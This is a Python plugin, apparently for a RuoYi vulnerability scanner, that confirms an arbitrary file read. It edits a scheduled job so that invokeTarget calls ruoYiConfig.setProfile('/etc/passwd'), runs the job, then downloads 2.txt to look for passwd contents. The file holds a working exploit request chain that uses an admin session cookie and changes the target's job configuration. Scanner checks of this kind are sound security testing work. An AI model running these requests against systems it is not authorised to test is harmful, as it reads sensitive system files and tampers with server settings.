# 定时任务任意文件读取：edit→run 触发 ruoYiConfig.setProfile，再读取落地文件 2.txt
from plugins.base import PluginBase
from core.models import ScanResult, STATUS_CONFIRMED, STATUS_SAFE, STATUS_UNKNOWN
from lib.colors import ok, no
from lib.http import host_of, join_url
from lib.matcher import match_all
from config import settings


class FileReadTimePlugin(PluginBase):
    name = '定时任务任意文件读取'
    cve = ''
    severity = 'high'
    category = 'vuln'
    description = '通过定时任务 edit 修改 invokeTarget 为 ruoYiConfig.setProfile(/etc/passwd)，run 后读取落地文件 2.txt'
    fix = '限制定时任务 invokeTarget 参数，禁止调用任意方法；后台强制鉴权'

    def verify(self, target, session):
        # 严格保留固定 JSESSIONID + edit → run → GET 2.txt 的请求时序
        host = host_of(target)
        jsess = settings.JOB_JSESSIONID

        # Step 1：编辑定时任务（写入 invokeTarget）
        headers1 = {
            'accept': '/',
            'user-agent': 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;SV1)',
            'Cookie': 'JSESSIONID=' + jsess,
            'Host': host,
            'Connection': 'close',
            'Content-type': 'application/x-www-form-urlencoded',
            'Content-Length': "187"
        }
        data1 = {
            "jobId": "4", "updateBy": "admin", "jobName": "beb528e3", "jobGroup": "DEFAULT",
            "invokeTarget": "ruoYiConfig.setProfile('/etc/passwd')",
            "cronExpression": "0%2F10+++++%3F",
            "misfirePolicy": "1", "concurrent": "1", "status": "1", "remark": ""
        }
        try:
            session.post(join_url(target, '/monitor/job/edit'), headers=headers1, data=data1)
        except Exception as e:
            print(no('定时任务任意文件读取（edit 异常）'))
            return ScanResult(kind='vuln', name=self.name, status=STATUS_UNKNOWN, evidence=str(e))

        # Step 2：运行定时任务
        headers2 = {
            'accept': '/',
            'user-agent': 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;SV1)',
            'Cookie': 'JSESSIONID=' + jsess,
            'Host': host,
            'Connection': 'close',
            'Content-type': 'application/x-www-form-urlencoded',
            'Content-Length': "7"
        }
        try:
            session.post(join_url(target, '/monitor/job/run'), headers=headers2, data={'jobId': '4'})
        except Exception as e:
            print(no('定时任务任意文件读取（run 异常）'))
            return ScanResult(kind='vuln', name=self.name, status=STATUS_UNKNOWN, evidence=str(e))

        # Step 3：读取落地文件 2.txt
        url2 = join_url(target, '/common/download/resource?resource=2.txt')
        try:
            file_install = session.get(url2).text
        except Exception as e:
            print(no('定时任务任意文件读取（读取 2.txt 异常）'))
            return ScanResult(kind='vuln', name=self.name, status=STATUS_UNKNOWN, evidence=str(e))

        # 判定 1:1 保留：'root' 与 ':/' 同时出现（使用 match_all 统一判定）
        if match_all(file_install, ['root', ':/']):
            print(ok('存在定时任务任意文件读取漏洞'))
            return ScanResult(kind='vuln', name=self.name, severity=self.severity,
                              status=STATUS_CONFIRMED, url=url2,
                              evidence='响应含 root 与 :/ 特征（落地文件 2.txt）', fix=self.fix)
        else:
            print(no('不存在定时任务任意文件读取漏洞'))
            return ScanResult(kind='vuln', name=self.name, status=STATUS_SAFE, url=url2)
